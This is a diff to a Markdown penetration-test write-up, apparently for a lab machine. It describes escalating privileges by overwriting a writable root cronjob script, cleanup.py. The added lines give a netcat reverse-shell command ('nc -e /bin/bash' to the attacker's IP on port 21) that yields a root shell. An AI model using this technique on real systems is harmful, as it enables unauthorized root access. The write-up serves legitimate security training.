@@ -206,14 +206,20 @@ Enumerated top 200 UDP ports:
 #### -Per linpeas.sh scan I found the following cronjob running every 3 minutes
 ![](Pasted%20image%2020221018232421.png)
 
+## Privilege Escalation vector
+## Found a cronjob which is writable  running every 3 minutes
+
 #### -Cat'd "/var/www/html/booked/cleanup.py" and found the following:
 ![](Pasted%20image%2020221018232524.png)
 
+##### -As I kept receiving errors when trying to navigate on "vi" locally on target machine I created a "cleanup.py" file on my kali machine and changed "rm -r /var/www/html/booked/uploads/reservation/* " to "nc -e /bin/bash 192.168.49.235 21":
 
+![](Pasted%20image%2020221018232639.png)
 
+##### -I then uploaded the "cleanup.py" script I created onto target machine and typed "mv cleanup.py /var/www/html/booked/" to overwrite the existing cleanup.py file in /var/www/html/booked/ and started a netcat listener on port 21 and waited a few minutes and received a root shell:
 
-## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+![](Pasted%20image%2020221018232733.png)
+
 
 ---
 
